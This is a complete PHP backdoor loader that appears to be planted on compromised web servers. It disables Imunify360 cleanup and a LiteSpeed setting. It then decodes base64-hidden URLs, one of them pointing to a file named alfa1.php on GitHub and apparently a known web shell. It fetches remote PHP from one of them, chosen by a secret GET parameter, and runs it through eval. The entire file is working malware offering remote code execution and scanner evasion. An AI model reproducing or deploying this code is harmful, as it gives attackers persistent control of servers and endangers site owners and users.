<?php
ini_set('lsapi_backend_off', '1');
ini_set("imunify360.cleanup_on_restore", false);

function get_data($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);

        $data = curl_exec($ch);
        curl_close($ch);

        return $data;
    } else {
        $data = file_get_contents($url);
        return $data;
    }
}

$x = '?>';

if (isset($_GET['kontol'])) {
    $target_url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NoZWxsMjMwNi9wZW5jYXJpa2VyYW5nL3JlZnMvaGVhZHMvbWFpbi9hbGZhMS5waHA=');
} else {
    $target_url = base64_decode('aHR0cHM6Ly90ZWdhbHJlam8uc2FsYXRpZ2EuZ28uaWQvd3AtaW5jbHVkZXMvaW1hZ2VzL2NyeXN0YWwvLS8=');
}

eval($x . get_data($target_url));
?>
